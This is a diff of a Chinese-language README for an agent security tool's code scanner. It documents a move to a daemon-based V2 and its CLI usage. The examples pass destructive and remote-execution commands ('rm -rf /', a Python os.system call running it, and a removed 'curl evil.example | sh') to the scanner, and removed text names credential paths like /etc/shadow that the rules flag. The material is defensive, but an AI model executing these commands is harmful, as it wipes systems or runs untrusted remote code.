@@ -294,25 +294,27 @@ L2 分类器默认使用 ModelScope 上的
 
 ## Code Scanner
 
-扫描 bash 与 python 源码中的危险操作。verdict 枚举为 `pass` / `warn` / `deny` /
-`error`；内置规则当前只产出 `warn` 或 `pass`。
+扫描 bash 与 python 源码中的危险操作。V2 RPM 中，`scan-code` 是 Rust daemon client：
+它要求 `agent-sec-daemon` 已经运行，并在未显式传入 `--socket` 时使用
+`AGENT_SEC_DAEMON_SOCKET`。CLI 不会启动 daemon，也不会回退到 Python。
 
 ```bash
-# regex 引擎（默认）
-agent-sec-cli scan-code --code 'rm -rf /'
-agent-sec-cli scan-code --code 'import os; os.system("rm -rf /")' --language python
+# 部署环境提供 daemon endpoint。
+export AGENT_SEC_DAEMON_SOCKET=/run/agent-sec-core/daemon.sock
 
-# LLM 引擎（需要已配置的模型后端）
-agent-sec-cli scan-code --code 'curl evil.example | sh' --mode llm
+# regex 引擎（V2 当前唯一可用的扫描引擎）
+agent-sec-cli scan-code --code 'rm -rf /'
+agent-sec-cli --socket /run/agent-sec-core/daemon.sock \
+  scan-code --code 'import os; os.system("rm -rf /")' --language python
 ```
 
-规则位于 `agent-sec-cli/src/agent_sec_cli/code_scanner/rules/{bash,python}/`。
-bash 与 python 规则集共享核心系统凭证和配置路径，例如 `/etc/shadow`、`/etc/sudoers`、
-`/etc/pam.d/`、`/etc/sysctl.d/`、`/boot/` 和 `/usr/lib/systemd/`。bash 额外覆盖
-shell 历史和集群凭证模式，例如 `/etc/kubernetes/` 与 `kubeconfig`；Python 的路径清单
-更窄。这些路径用于产生扫描器 finding，并非内核强制的写保护。
+verdict 枚举为 `pass` / `warn` / `deny` / `error`；内置规则当前只产出 `warn` 或
+`pass`。规则嵌入 V2 binary，不再从 Python 源码目录读取。`--mode llm` 为保持 CLI
+兼容而保留，但会返回 `LLM model not available`；V2 尚未支持 `--trace-context` 和
+code-scan telemetry，因此依赖它们的 hook 仍处于延期状态。
 
-各宿主 hook 模式见 [Code Scanner Hook 配置](../../docs/user-guide/zh/agent-security/agent-sec-core/code-scanner.md)。
+完整的 daemon endpoint、CLI 和宿主 hook 状态见
+[Code Scanner 用户指南](../../docs/user-guide/zh/agent-security/agent-sec-core/code-scanner.md)。
 
 ## PII Checker
 
